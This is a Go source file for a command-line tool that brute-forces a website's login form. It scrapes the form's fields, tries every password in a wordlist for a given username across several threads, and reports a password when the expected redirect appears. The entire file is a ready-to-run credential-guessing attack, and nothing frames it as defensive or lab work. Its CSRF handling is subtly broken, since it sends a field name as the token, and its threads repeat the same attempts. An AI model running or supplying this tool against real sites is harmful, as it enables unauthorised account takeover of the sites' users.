package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

func parseArguments() (string, string, string, string, int) {
	username := flag.String("l", "", "Username to use for login attempts")
	url := flag.String("u", "", "URL of the login page (e.g., http://example.com/login)")
	redirect := flag.String("redirect", "", "URL to redirect to, indicating a successful login")
	wordlist := flag.String("wordlist", "", "Path to the wordlist file containing passwords")
	threads := flag.Int("threads", 1, "Number of threads to use (default: 1)")
	flag.Parse()

	if *username == "" || *url == "" || *redirect == "" || *wordlist == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	return *username, *url, *redirect, *wordlist, *threads
}

func getLoginFormDetails(url string) (string, string, string, string, string) {
	resp, err := http.Get(url)
	if err != nil || resp.StatusCode != 200 {
		fmt.Println("Failed to retrieve the login page.")
		return "", "", "", "", ""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading the response body.")
		return "", "", "", "", ""
	}

	// Convert body to string
	bodyStr := string(body)

	// Find the form action
	actionURL := getFormAction(bodyStr, url)
	if actionURL == "" {
		fmt.Println("No form action URL found.")
		return "", "", "", "", ""
	}

	// Find the method (POST or GET)
	method := getFormMethod(bodyStr)

	// Find the input fields (username, password, csrf)
	usernameField := getInputField(bodyStr, "user", "login")
	passwordField := getInputField(bodyStr, "pass", "password")
	csrfToken := getInputField(bodyStr, "csrf", "")

	return actionURL, method, usernameField, passwordField, csrfToken
}

func getFormAction(body, defaultURL string) string {
	re := regexp.MustCompile(`<form[^>]*action=["']([^"']+)["'][^>]*>`)
	match := re.FindStringSubmatch(body)
	if len(match) > 1 {
		return match[1]
	}
	return defaultURL
}

func getFormMethod(body string) string {
	re := regexp.MustCompile(`<form[^>]*method=["']([^"']+)["'][^>]*>`)
	match := re.FindStringSubmatch(body)
	if len(match) > 1 {
		return strings.ToUpper(match[1])
	}
	return "POST"
}

func getInputField(body, field1, field2 string) string {
	re := regexp.MustCompile(`<input[^>]*name=["']([^"']+)["'][^>]*>`)
	matches := re.FindAllStringSubmatch(body, -1)
	for _, match := range matches {
		name := match[1]
		if strings.Contains(name, field1) || (field2 != "" && strings.Contains(name, field2)) {
			return name
		}
	}
	return ""
}

func attemptLogin(client *http.Client, actionURL, method, usernameField, passwordField, csrfToken, username, password, redirectURL string) bool {
	data := url.Values{}
	data.Set(usernameField, username)
	data.Set(passwordField, password)
	if csrfToken != "" {
		data.Set("csrf_token", csrfToken)
	}

	var req *http.Request
	var err error

	if method == "POST" {
		req, err = http.NewRequest("POST", actionURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest("GET", actionURL+"?"+data.Encode(), nil)
	}

	if err != nil {
		fmt.Println("Request error:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request error:", err)
		return false
	}
	defer resp.Body.Close()

	if resp.Request.URL.String() == redirectURL {
		fmt.Printf("[SUCCESS] Login successful with password: %s\n", password)
		return true
	} else {
		fmt.Printf("[FAILURE] Username: %s, Password: %s\n", username, password)
	}

	return false
}

func worker(username, url, redirectURL, wordlist string, wg *sync.WaitGroup, actionURL, method, usernameField, passwordField, csrfToken string) {
	defer wg.Done()

	client := &http.Client{}
	file, err := os.Open(wordlist)
	if err != nil {
		fmt.Println("Error opening wordlist:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		success := attemptLogin(client, actionURL, method, usernameField, passwordField, csrfToken, username, password, redirectURL)
		if success {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading wordlist:", err)
	}
}

func main() {
	username, url, redirectURL, wordlist, threads := parseArguments()

	actionURL, method, usernameField, passwordField, csrfToken := getLoginFormDetails(url)
	if actionURL == "" {
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(username, url, redirectURL, wordlist, &wg, actionURL, method, usernameField, passwordField, csrfToken)
	}

	wg.Wait()
}
